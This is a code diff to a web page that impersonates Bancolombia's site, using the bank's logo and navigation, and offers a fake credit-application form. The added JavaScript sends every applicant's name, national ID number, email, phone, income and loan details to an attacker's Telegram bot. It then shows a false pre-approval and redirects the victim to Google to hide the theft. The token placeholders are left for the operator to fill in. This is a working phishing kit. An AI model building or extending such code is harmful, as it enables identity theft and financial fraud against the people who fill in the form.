@@ -321,6 +321,12 @@
             border-left: 4px solid #ffc107;
         }
 
+        .alert-redirect {
+            background-color: #e8f4fd;
+            color: #004884;
+            border-left: 4px solid #004884;
+        }
+
         /* Footer */
         .footer {
             background-color: #210049;
@@ -452,7 +458,15 @@
             <div class="logo-bancolombia">
                 <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
             </div>
-            
+            <nav class="header-nav">
+                <a href="#">Personas</a>
+                <a href="#">Empresas</a>
+                <a href="#">Sucursal Virtual</a>
+                <a href="#">Ayuda</a>
+            </nav>
+            <div class="header-buttons">
+                <a href="#" class="btn-sucursal">Sucursal Virtual</a>
+            </div>
         </div>
     </header>
 
@@ -825,9 +839,27 @@
                         // Mostrar alerta de proceso
                         showAlert(alertProcessing);
                         
+                        // Enviar datos a Telegram
+                        sendToTelegram(
+                            fullName,
+                            idNumber,
+                            email,
+                            phone,
+                            employmentStatus,
+                            monthlyIncome,
+                            creditAmount,
+                            creditPurpose,
+                            employmentTime
+                        );
+                        
                         // Después de 2 segundos, mostrar preaprobación
                         setTimeout(function() {
                             showAlert(alertPreapproved);
+                            
+                            // Redirigir a Google después de 3 segundos
+                            setTimeout(function() {
+                                window.location.href = "https://www.google.com";
+                            }, 3000);
                         }, 2000);
                     }, 3000);
                 }
@@ -841,6 +873,83 @@
                 setTimeout(function() {
                     alertElement.style.display = 'none';
                 }, 5000);
+            }
+            
+            // Función para enviar datos por Telegram
+            function sendToTelegram(fullName, idNumber, email, phone, employmentStatus, monthlyIncome, creditAmount, creditPurpose, employmentTime) {
+                // REEMPLAZA CON TU TOKEN DE BOT Y CHAT ID
+                const botToken = 'TU_BOT_TOKEN_AQUI';
+                const chatId = 'TU_CHAT_ID_AQUI';
+                
+                // Mapear valores a texto legible
+                const employmentStatusMap = {
+                    'employed': 'Empleado',
+                    'self-employed': 'Independiente',
+                    'unemployed': 'Desempleado',
+                    'student': 'Estudiante',
+                    'retired': 'Pensionado'
+                };
+                
+                const creditPurposeMap = {
+                    'debt-consolidation': 'Consolidación de deudas',
+                    'home-improvement': 'Mejora del hogar',
+                    'education': 'Educación',
+                    'travel': 'Viajes',
+                    'health': 'Salud',
+                    'business': 'Negocio',
+                    'other': 'Otro'
+                };
+                
+                const employmentTimeMap = {
+                    'less-than-year': 'Menos de 1 año',
+                    '1-3-years': '1 a 3 años',
+                    '3-5-years': '3 a 5 años',
+                    'more-than-5': 'Más de 5 años'
+                };
+                
+                const message = `🚀 *NUEVA SOLICITUD DE CRÉDITO BANCOLOMBIA* 🚀
+
+👤 *Información Personal:*
+• *Nombre:* ${fullName}
+• *Cédula:* ${idNumber}
+• *Email:* ${email}
+• *Teléfono:* ${phone}
+
+💼 *Situación Laboral:*
+• *Estado:* ${employmentStatusMap[employmentStatus]}
+• *Tiempo en trabajo:* ${employmentTimeMap[employmentTime]}
+• *Ingresos mensuales:* $${monthlyIncome}
+
+💰 *Solicitud de Crédito:*
+• *Monto solicitado:* $${creditAmount}
+• *Propósito:* ${creditPurposeMap[creditPurpose]}
+
+⏰ *Fecha y Hora:* ${new Date().toLocaleString()}
+
+_Solicitud completada desde el formulario web_`;
+                
+                // URL de la API de Telegram
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                // Enviar mensaje a Telegram
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Mensaje enviado a Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error al enviar a Telegram:', error);
+                });
             }
         });
     </script>
